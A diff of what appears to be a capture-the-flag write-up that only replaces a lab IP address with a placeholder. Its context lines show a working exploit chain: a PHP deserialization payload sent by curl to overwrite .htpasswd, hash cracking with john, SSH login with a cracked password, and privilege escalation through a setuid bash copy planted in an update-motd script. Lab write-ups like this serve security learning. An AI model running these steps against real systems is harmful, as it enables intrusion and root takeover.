@@ -101,7 +101,7 @@ echo urlencode($payload);
 ### Exploitation
 
 ```bash
-curl "http://10.113.140.151/?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22.htpasswd%22%3Bs%3A7%3A%22message%22%3Bs%3A37%3A%22james%3A%24apr1%24zPZMix2A%24d8fBXH0em33bfI9UTt9Nq1%22%3B%7D"
+curl "http://[REDACTED]/?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22.htpasswd%22%3Bs%3A7%3A%22message%22%3Bs%3A37%3A%22james%3A%24apr1%24zPZMix2A%24d8fBXH0em33bfI9UTt9Nq1%22%3B%7D"
 ```
 
 ### .htpasswd Retrieval
@@ -130,7 +130,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ### SSH Login
 
 ```bash
-ssh james@10.113.140.151
+ssh james@[REDACTED]
 # Password: jamaica
 ```
 
@@ -176,7 +176,7 @@ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/update-motd.
 Open a new SSH session to trigger the MOTD script:
 
 ```bash
-ssh james@10.113.140.151
+ssh james@[REDACTED]
 # Logout
 ```
 
